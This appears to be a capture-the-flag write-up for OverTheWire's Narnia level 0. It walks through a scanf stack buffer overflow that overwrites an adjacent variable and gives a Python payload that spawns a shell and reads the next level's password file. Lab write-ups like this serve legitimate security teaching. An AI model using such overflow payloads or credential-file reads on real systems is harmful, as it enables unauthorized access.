# OverTheWire — Narnia Level 0 → 1

> Goal: Get narnia1 password from `narnia0`. Result: **`**********`** (hidden)
> Technique: stack buffer overflow → overwriting **adjacent variable** (`val`) (not EIP).
> Environment: 32-bit, ASLR disabled, stack executable.

---

## 1. Connection
```bash
ssh narnia0@narnia.labs.overthewire.org -p 2226   # password: narnia0
```

## 2. Source (`/narnia/narnia0.c`)
```c
int main(){
    long val = 0x41414141;     // goal: make it 0xdeadbeef
    char buf[20];
    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s", &buf);       // BUG: reads 24 chars into 20-byte buffer
    printf("buf: %s\n", buf);
    printf("val: 0x%08x\n", val);
    if(val == 0xdeadbeef){ setreuid(geteuid(),geteuid()); system("/bin/sh"); }
    else { printf("WAY OFF!!!!\n"); exit(1); }
}
```

## 3. Vulnerability
`scanf("%24s")` allows 24 characters (+ `\0` → 25 bytes) but `buf` is 20 bytes. The overflow
overwrites adjacent `val`. The bytes of `val` (`ef be ad de`) are not space/tab/newline →
`scanf %s` won't stop, so we're lucky.

## 4. Offset — from disasm
```
mov  DWORD PTR [ebp-0xc], 0x41414141    ; val = ebp-0x0c
lea  eax, [ebp-0x20]                    ; buf = ebp-0x20
```
Distance `buf → val` = `0x20 - 0x0c = 0x14 = **20 bytes**`. (Matches `buf[20]` in source.)

```
[ buf (20) ][ val (4) ][ saved ebp ][ saved eip ]
  └ 20 padding ┘ └ 0xdeadbeef ┘
```

## 5. Exploit
```
payload = "A"*20 + 0xdeadbeef (LE: \xef\xbe\xad\xde)   = 24 bytes
```
`scanf %24s` reads exactly 24 bytes; the remaining stdin goes to the spawned shell.

> ⚠️ **stdio buffering trap (live solution output):** When giving the payload all at once via
> `| ./narnia0`, stdin is slurped by glibc buffer before `system("/bin/sh")`'s child shell can
> read it. Solution: send payload, **wait briefly** (let scanf read + shell open), then send command:
```bash
python3 -c '
import sys,time
sys.stdout.buffer.write(b"A"*20 + b"\xef\xbe\xad\xde"); sys.stdout.flush(); time.sleep(1.5)
sys.stdout.buffer.write(b"id; cat /etc/narnia_pass/narnia1\n"); sys.stdout.flush(); time.sleep(1.0)
' | /narnia/narnia0
```
Output:
```
val: 0xdeadbeef
uid=14001(narnia1) gid=14000(narnia0) groups=14000(narnia0)
**********
```


## Lessons
| Topic | Note |
|-------|------|
| Adjacent variable overwrite | Overflowing buffer corrupts adjacent `val` (no need for EIP) |
| `scanf %Ns` | N chars + `\0` → can write N+1 bytes; stops at space/`\n`/`\t` |
| Little-endian | `0xdeadbeef` → `\xef\xbe\xad\xde` |
| stdio buffering | `scanf` slurps pipe → feed command with timing |
| Verify offset | Source `buf[20]` ≠ guaranteed; confirm from disasm (`ebp-0x20` vs `ebp-0xc`) |
